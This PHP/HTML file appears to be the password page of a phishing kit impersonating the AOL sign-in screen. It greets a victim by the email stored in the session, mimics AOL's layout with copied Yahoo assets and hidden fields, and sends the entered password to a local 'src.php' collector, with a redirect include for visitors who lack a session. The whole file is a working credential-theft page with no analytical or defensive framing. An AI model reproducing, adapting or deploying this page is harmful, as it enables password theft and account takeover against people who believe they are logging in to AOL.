<?php
@session_start();
ob_start();
function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}

if (loggedin()) {
    $userlogged = $_SESSION['email'];
} else {
    die(include './AOL/Go_off.php');
}


?>
<!DOCTYPE html>
<html id="Stencil" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL
</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="aol-main.css" rel="stylesheet" type="text/css">
        
    <body>
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page=content&amp;y=PROD_ACCT&amp;id=SLN4556&amp;actp=productlink&amp;locale=en_US">More&nbsp;Info</a>
            </p>
        </div>

    <div id="login-body" class="loginish  puree-v2 responsive">
    <div class="mbr-desktop-hd pure-g">
    <div class="pure-u-4-5">
         <a href="https://www.aol.com/">
            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
        </a>
    </div>
    <div class="pure-u-1-5 txt-align-right">
        <div class="help"><a href="https://help.aol.com/">Help</a></div>
    </div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
            </div>
            <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello&nbsp;<?php echo "$userlogged"; ?></h1>
            <p class="not-you"><a href="./?display=login&amp;lang=en-US&amp;language=en-US&amp;src=mail&amp;done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%252Cycal-w%252Copenid%252Copenid2%252Cmail-w%252Cmail-x%252Csdps-r%252Cmsgr-w%26src%3Dmail%26language%3Den-US%26state%3Dhttps%253A%252F%252Fmail.aol.com%252F_cqr%252FloginSuccess%253F%2526siteState%253Duv%25253AAOL%25253Brt%25253ASTD%25253Bat%25253ASNS%25253Blc%25253Aen_US%25253Bld%25253Amail.aol.com%25253Bsnt%25253AScreenName%25253Bsid%25253A12c05b17-d151-472e-974b-2722e2e8a29f%25253Bqp%25253A%25253B%2526lang%253Den%2526locale%253DUS%26nonce%3DdTk78fGFm5E959zQGUvKe3QZTTHXj2af%26.scrumb%3D0&amp;prefill=0">Not&nbsp;you?</a></p>
    </div>
    <form action="src.php" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;color_depth&quot;:24,&quot;resolution&quot;:{&quot;w&quot;:1366,&quot;h&quot;:768},&quot;available_resolution&quot;:{&quot;w&quot;:1366,&quot;h&quot;:728},&quot;timezone_offset&quot;:420,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;open_database&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Win32&quot;,&quot;do_not_track&quot;:&quot;1&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;adblock&quot;:0,&quot;has_lied_languages&quot;:0,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:0,&quot;has_lied_browser&quot;:0,&quot;touch_support&quot;:{&quot;points&quot;:0,&quot;event&quot;:1,&quot;start&quot;:0},&quot;plugins&quot;:{&quot;count&quot;:3,&quot;hash&quot;:&quot;e43a8bc708fc490225cde0663b28278c&quot;},&quot;fonts&quot;:{&quot;count&quot;:49,&quot;hash&quot;:&quot;73a5ce890bdadb0295b20ba41e66f0ff&quot;},&quot;ts&quot;:{&quot;serve&quot;:1532043794921,&quot;render&quot;:1532043791959}}">
        <input type="hidden" name="crumb" value="uRHa8/dtJIZ">
        <input type="hidden" name="acrumb" value="omFAKHGU">
        <input type="hidden" name="sessionIndex" value="Qw--">
        <input type="hidden" name="displayName" value="critdriesen">
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="">
        </div>
        <input type="hidden" name="passwordContext" value="normal">
        <input type="password" id="login-passwd" name="password" placeholder="Password" autofocus="">
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
           <a href="./?top=y-auth&crumb=accountspartner/?srcs=vz&intl=us-en&lang=en-USA&partner=verizon-acs&authMechanism=primary&display=login&done=https%3A%2F%2Fverizon.yahoo.com"> <p class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Take me to Yahoo!</p></a>
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
        <div id="sb_rel_login-ad-rich"></div>
        </div>
    </div>
</div>

    <script src="https://s.yimg.com/wm/mbr/0.1.6214/bundle.js"></script><div id="ads"></div>
    <noscript>
        <img src="https://login.aol.com/account/js-reporting/?crumb=uRHa8/dtJIZ&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>

    <div id="mbr-css-check"></div>


<div id="fdb_close_els" class="darla" style="position: static !important; visibility: inherit;"><div id="fdb_close_RICH" class="darla darla_fdb_close" title="I don&#39;t like this ad" style="position: absolute; top: 63.0156px; left: 0px; z-index: 10; width: 1361px; height: 20px; visibility: inherit; display: none;"><div style="width:20px; height:20px; background:#fff; opacity: 0.78; -ms-filter: &#39;progid:DXImageTransform.Microsoft.Alpha(Opacity=78)&#39;; filter: alpha(opacity=78); position: absolute;right:0; background: #fff url(&#39;https://s.yimg.com/rq/darla/i/fdb1.gif&#39;) no-repeat right -25px;cursor:pointer;"></div></div></div></body></html>